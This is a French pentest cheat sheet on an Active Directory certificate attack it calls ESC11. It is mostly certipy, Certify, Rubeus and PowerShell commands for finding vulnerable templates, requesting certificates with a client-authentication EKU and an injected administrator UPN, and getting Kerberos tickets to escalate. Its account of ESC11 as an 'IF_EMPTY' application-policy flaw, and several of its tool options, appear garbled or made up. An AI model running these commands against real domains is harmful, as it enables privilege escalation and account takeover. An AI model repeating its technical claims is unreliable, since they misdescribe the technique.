### Description

ESC11 exploite des modèles de certificats qui utilisent l'option `IF_EMPTY` dans la configuration `msPKI-Certificate-Application-Policy`, permettant à un utilisateur de spécifier des politiques d'application arbitraires si aucune n'est définie, contournant ainsi les restrictions d'usage prévues et permettant l'authentification client même sur des templates non prévus à cet effet.

### Conditions vulnérables

Un modèle de certificat est vulnérable à ESC11 si :

1. **Configuration IF_EMPTY** - Le modèle a `msPKI-Certificate-Application-Policy` configuré avec l'option `IF_EMPTY`
2. **Politiques d'application non définies** - Aucune politique d'application spécifique n'est forcée
3. **Enrollment autorisé** - L'utilisateur a les droits `Enroll` ou `AutoEnroll`
4. **Possibilité d'injection de politiques** - L'utilisateur peut spécifier des politiques d'application lors de la demande

---

### Exploitation depuis linux (certipy)

Enumération des templates vulnérables :

```bash
certipy find -u user@domain.local -p password -target dc01.domain.local

# Énumération avec sortie JSON pour analyse des politiques d'application
certipy find -u user@domain.local -p password -target dc01.domain.local -json -output vulnerabilities.json 

# Recherche spécifique des templates avec IF_EMPTY
certipy find -u user@domain.local -p password -target dc01.domain.local -vulnerable | grep -A10 -B5 "IF_EMPTY\|Application Policy"
```

Exploitation avec injection de politique d'authentification :

```bash
# Demande d'un certificat en spécifiant Client Authentication
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'IfEmptyTemplate' -key-usage "DigitalSignature,KeyEncipherment" -extended-key-usage "1.3.6.1.5.5.7.3.2"

# Avec SAN si le template le permet également
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'IfEmptyTemplate' -upn administrator@domain.local -extended-key-usage "1.3.6.1.5.5.7.3.2"
```

Authentification avec le certificat modifié :

```bash
# Authentification avec le certificat contenant Client Authentication
certipy auth -pfx user.pfx -username user -domain domain.local -dc-ip 192.168.1.10

# Si SAN a pu être injecté
certipy auth -pfx administrator.pfx -username administrator -domain domain.local -dc-ip 192.168.1.10
```

---

### Exploitation depuis windows (certify.exe)

Enumération des templates vulnérables :

```powershell
# Énumération des modèles vulnérables 
Certify.exe find /vulnerable 

# Filtrage spécifique ESC11
Certify.exe find /vulnerable | findstr "IF_EMPTY\|Application Policy"

# Vérification manuelle des politiques d'application
Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} -Properties * | Where-Object {
    $_.'msPKI-Certificate-Application-Policy' -match "IF_EMPTY"
} | Select-Object Name, 'msPKI-Certificate-Application-Policy'
```

Exploitation du template vulnérable :

```powershell
# Demande d'un certificat en injectant Client Authentication EKU
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:IfEmptyTemplate /eku:"1.3.6.1.5.5.7.3.2"

# Combiné avec d'autres options si possible
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:IfEmptyTemplate /eku:"1.3.6.1.5.5.7.3.2" /altname:administrator@domain.local
```

Authentification avec le certificat obtenu :

```powershell
# Conversion du certificat si nécessaire
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx 

# Authentification avec le certificat 
Rubeus.exe asktgt /user:user /certificate:cert.pfx /password:password123 /ptt

# Si escalation réussie
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:password123 /ptt
```